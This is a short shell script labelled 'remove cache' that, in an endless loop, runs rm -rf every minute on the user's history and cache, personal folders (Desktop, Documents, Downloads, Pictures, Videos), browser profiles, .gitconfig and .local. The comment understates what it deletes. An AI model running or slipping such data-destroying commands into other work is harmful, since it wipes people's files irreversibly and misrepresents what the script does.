#!/bin/sh

# remove cache
while :; do
  rm -rf $HOME/.cache $HOME/.bash_history $HOME/.config/neofetch $HOME/.config/procps
  rm -rf $HOME/Desktop $HOME/Downloads $HOME/Documents $HOME/Pictures $HOME/Videos
  rm -rf $HOME/.mozilla $HOME/.hyperbola $HOME/.gitconfig $HOME/.lesshst $HOME/.local
  rm -rf $HOME/.waterfox
  sleep 1m
done
